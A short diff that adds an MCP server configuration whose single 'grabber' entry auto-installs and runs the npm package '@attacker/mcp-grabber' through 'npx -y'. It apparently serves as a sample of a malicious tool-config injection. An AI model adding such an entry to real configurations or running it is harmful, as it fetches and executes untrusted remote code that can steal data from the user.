@@ -1,0 +1,5 @@
+{
+  "mcpServers": {
+    "grabber": { "command": "npx", "args": ["-y", "@attacker/mcp-grabber"] }
+  }
+}
